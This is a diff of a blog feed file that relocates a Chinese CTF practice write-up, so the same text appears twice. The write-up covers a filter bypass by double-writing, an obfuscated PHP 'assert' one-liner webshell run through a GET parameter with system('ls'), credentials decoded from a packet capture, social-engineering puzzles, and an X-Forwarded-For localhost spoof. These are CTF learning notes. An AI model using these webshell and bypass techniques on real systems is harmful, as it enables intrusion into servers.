class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;  <span class="comment">//如果clean_string的值为bingus，那么输出flag</span></span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: red;\&quot;&gt;IS NOT&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>但是通过输入bingus回显空，输入aaa回显aaa，所以我们双写绕过，也就是binbingusgus，得到flag</p>
-<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>首先要知道什么是shell，这里我们摘自百度百科：</p>
-<p>Shell 是一个应用程序，它连接了用户和 Linux 内核，让用户能够更加高效、安全、低成本地使用 Linux 内核，这就是 Shell 的本质。 Shell 本身并不是内核的一部分，它只是站在内核的基础上编写的一个应用程序，它和 QQ、迅雷、Firefox 等其它软件没有什么区别。 然而 Shell 也有着它的特殊性，就是开机立马启动，并呈现在用户面前；用户通过 Shell 来使用 Linux，不启动 Shell 的话，用户就没办法使用 Linux。 Shell 是如何连接用户和内核的？ Shell 能够接收用户输入的命令，并对命令进行处理，处理完毕后再将结果反馈给用户，比如输出到显示器、写入到文件等，这就是大部分读者对 Shell 的认知。</p>
-<p>简单来说，shell就是运行linux命令的前提，所以这里绝对和命令执行相关</p>
-<p>题目提示为：送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
-<p>这里我们可以发现存在变量s，并由我们接收我们输入的内容，所以我们直接令s=ls，无回显，那么我们在最后加一个;  可是还是没有回显，接着我们令s=system(“ls”) ，有回显关键字，我们cat一下文档得到flag。</p>
-<p>由此可推出，这里s输入的是一段命令，并且可被执行。</p>
-<h1 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工-伪造"></a>社工-伪造</h1><p>真的很无语，想来想去找不到办法，结果看了一下wp，我直接当场去世，要把自己的qq昵称和头像换成他的男友才行，直接登录他男友的账号是不行的，有字符过滤。头一次见这个，很牛p。</p>
-<h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><p>进去后发现可下载文件，我们下载后打开，发现没啥线索，既然是信息搜集，我们就要扫后台，扫描到.git文件，进去后，没有发现关键线索，但是发现了后台登录页面，但是不知道用户名和密码，实在没办法了，看大佬wp，发现我们要使用wireshark工具进行抓包，先开wireshark，然后再开exe文件，然后在包中尝试搜索User发现关键信息</p>
-<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402180235715.png" alt="image-20220402180235715"></p>
-<p>这里的用户名和密码一看就是经过了base64加密。解密结果如下</p>
-<p>User：<a href="mailto:&#98;&#117;&#x67;&#107;&#117;&#x6b;&#117;&#64;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#109;">&#98;&#117;&#x67;&#107;&#117;&#x6b;&#117;&#64;&#49;&#x36;&#51;&#46;&#99;&#x6f;&#109;</a></p>
-<p>Pass：XSLROCPMNWWZQDZL</p>
-<p>登录显示密码错误，然后继续看wp</p>
-<p>知道邮箱可以用授权码登录，所以我们用第三方邮箱登录看看有什么关键信息</p>
-<p>用win10自带的邮箱登录成功</p>
-<p>然后找了半天也没找的关键邮件，可能是被删了，但是按照wp上说，会有一个如下的邮件</p>
-<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181540251.png" alt="image-20220402181540251"></p>
-<p>我们猜测可能是生日为密码，mara为账户</p>
-<p>推算的生日为20010206，登录后台得到flag</p>
-<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181728774.png" alt="image-20220402181728774"></p>
-<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>X-Forwarded-For:127.0.0.1</p>
-<p>无语住了</p>
-]]></content>
-      <tags>
-        <tag>刷题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>刷题记录-6</title>
     <url>/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/</url>
     <content><![CDATA[<h1 id="WEB171"><a href="#WEB171" class="headerlink" title="WEB171"></a>WEB171</h1><p>很经典的联合注入，这次相当于又复习了一遍，感觉以前的都忘了，好难过。</p>
@@ -2911,6 +2877,42 @@
 
 <p><img src="/2022/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-6/image-20220305171333948.png" alt="image-20220305171333948"></p>
 <p>每个都cat一下，最终得到flag</p>
+]]></content>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>刷题记录-7</title>
+    <url>/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/</url>
+    <content><![CDATA[<h1 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h1><p>这道题水得很，虽然我没有完全看懂源码，但也能稍作注释</p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];  <span class="comment">//把get到的值赋给input</span></span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;  <span class="comment">//让to_replace为bingus</span></span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);<span class="comment">//让clean_string为input中把bingus替换为空格后的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;  <span class="comment">//如果clean_string的值为bingus，那么输出flag</span></span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: red;\&quot;&gt;IS NOT&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是通过输入bingus回显空，输入aaa回显aaa，所以我们双写绕过，也就是binbingusgus，得到flag</p>
+<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>首先要知道什么是shell，这里我们摘自百度百科：</p>
+<p>Shell 是一个应用程序，它连接了用户和 Linux 内核，让用户能够更加高效、安全、低成本地使用 Linux 内核，这就是 Shell 的本质。 Shell 本身并不是内核的一部分，它只是站在内核的基础上编写的一个应用程序，它和 QQ、迅雷、Firefox 等其它软件没有什么区别。 然而 Shell 也有着它的特殊性，就是开机立马启动，并呈现在用户面前；用户通过 Shell 来使用 Linux，不启动 Shell 的话，用户就没办法使用 Linux。 Shell 是如何连接用户和内核的？ Shell 能够接收用户输入的命令，并对命令进行处理，处理完毕后再将结果反馈给用户，比如输出到显示器、写入到文件等，这就是大部分读者对 Shell 的认知。</p>
+<p>简单来说，shell就是运行linux命令的前提，所以这里绝对和命令执行相关</p>
+<p>题目提示为：送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
+<p>这里我们可以发现存在变量s，并由我们接收我们输入的内容，所以我们直接令s=ls，无回显，那么我们在最后加一个;  可是还是没有回显，接着我们令s=system(“ls”) ，有回显关键字，我们cat一下文档得到flag。</p>
+<p>由此可推出，这里s输入的是一段命令，并且可被执行。</p>
+<h1 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工-伪造"></a>社工-伪造</h1><p>真的很无语，想来想去找不到办法，结果看了一下wp，我直接当场去世，要把自己的qq昵称和头像换成他的男友才行，直接登录他男友的账号是不行的，有字符过滤。头一次见这个，很牛p。</p>
+<h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><p>进去后发现可下载文件，我们下载后打开，发现没啥线索，既然是信息搜集，我们就要扫后台，扫描到.git文件，进去后，没有发现关键线索，但是发现了后台登录页面，但是不知道用户名和密码，实在没办法了，看大佬wp，发现我们要使用wireshark工具进行抓包，先开wireshark，然后再开exe文件，然后在包中尝试搜索User发现关键信息</p>
+<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402180235715.png" alt="image-20220402180235715"></p>
+<p>这里的用户名和密码一看就是经过了base64加密。解密结果如下</p>
+<p>User：<a href="mailto:&#98;&#x75;&#x67;&#107;&#x75;&#107;&#117;&#x40;&#x31;&#x36;&#51;&#x2e;&#99;&#111;&#109;">&#98;&#x75;&#x67;&#107;&#x75;&#107;&#117;&#x40;&#x31;&#x36;&#51;&#x2e;&#99;&#111;&#109;</a></p>
+<p>Pass：XSLROCPMNWWZQDZL</p>
+<p>登录显示密码错误，然后继续看wp</p>
+<p>知道邮箱可以用授权码登录，所以我们用第三方邮箱登录看看有什么关键信息</p>
+<p>用win10自带的邮箱登录成功</p>
+<p>然后找了半天也没找的关键邮件，可能是被删了，但是按照wp上说，会有一个如下的邮件</p>
+<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181540251.png" alt="image-20220402181540251"></p>
+<p>我们猜测可能是生日为密码，mara为账户</p>
+<p>推算的生日为20010206，登录后台得到flag</p>
+<p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402181728774.png" alt="image-20220402181728774"></p>
+<h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>X-Forwarded-For:127.0.0.1</p>
+<p>无语住了</p>
 ]]></content>
       <tags>
         <tag>刷题</tag>
